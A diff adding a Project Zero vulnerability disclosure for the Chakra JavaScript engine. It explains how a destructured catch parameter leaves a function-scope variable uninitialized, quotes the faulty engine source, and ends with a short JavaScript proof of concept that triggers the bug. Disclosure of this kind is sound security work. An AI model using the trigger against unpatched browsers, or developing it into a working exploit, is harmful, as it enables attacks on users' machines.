@@ -1,0 +1,76 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1266
+
+function trigger() {
+    try {
+    } catch (x) {
+        var x = 1;
+    }
+
+    print(x);
+}
+
+trigger();
+
+When Chakra executes the above code, it declares two "x"s. One is only for the catch scope, the other is for the whole function scope. The one for the whole function scope is initialized with undefined at the start of the function. If the bytecode generator incorrectly chooses the "x" to initialize, the "x" for the function scope may remain uninitialized. This choice is made in the following code in "ByteCodeGenerator::DefineUserVars".
+
+void ByteCodeGenerator::DefineUserVars(FuncInfo *funcInfo)
+{
+    ...
+    for (pnode = funcInfo->root->sxFnc.pnodeVars; pnode; pnode = pnode->sxVar.pnodeNext)
+    {
+        Symbol* sym = pnode->sxVar.sym;
+
+        if (sym != nullptr && !(pnode->sxVar.isBlockScopeFncDeclVar && sym->GetIsBlockVar()))
+        {
+            if (sym->GetIsCatch() || (pnode->nop == knopVarDecl && sym->GetIsBlockVar()))
+            {
+                ...
+                sym = funcInfo->bodyScope->FindLocalSymbol(sym->GetName()); <<< This returns the symbol for the function scope.
+                ...
+            }
+        }
+
+        // Emit bytecode which initalizes "sym"
+    }
+    ...
+}
+
+
+However, there's a buggy case that "sym->GetIsCatch()" returns false when it must return true.
+
+Here's a snippet of "PreVisitCatch". This function is supposed to call "SetIsCatch" for all the symbols in the exception parameter. But it doesn't call "SetIsCatch" when the condition "pnode->sxCatch.pnodeParam->nop == knopParamPattern" is satisfied. The PoC reproduces that case, the "x" for the function scope will refer to an uninitialized value in the stack.
+
+void PreVisitCatch(ParseNode *pnode, ByteCodeGenerator *byteCodeGenerator)
+{
+    // Push the catch scope and add the catch expression to it.
+    byteCodeGenerator->StartBindCatch(pnode);
+    if (pnode->sxCatch.pnodeParam->nop == knopParamPattern)
+    {
+        Parser::MapBindIdentifier(pnode->sxCatch.pnodeParam->sxParamPattern.pnode1, [&](ParseNodePtr item)
+        {
+            Symbol *sym = item->sxVar.sym;
+        });
+    }
+    else
+    {
+        Symbol *sym = *pnode->sxCatch.pnodeParam->sxPid.symRef;
+        sym->SetIsCatch(true);
+        pnode->sxCatch.pnodeParam->sxPid.sym = sym;
+    }
+    ...
+}
+
+PoC:
+-->
+
+function trigger() {
+    try {
+    } catch ({x}) {
+        var x = 1;
+    }
+
+    print(x);
+}
+
+trigger();
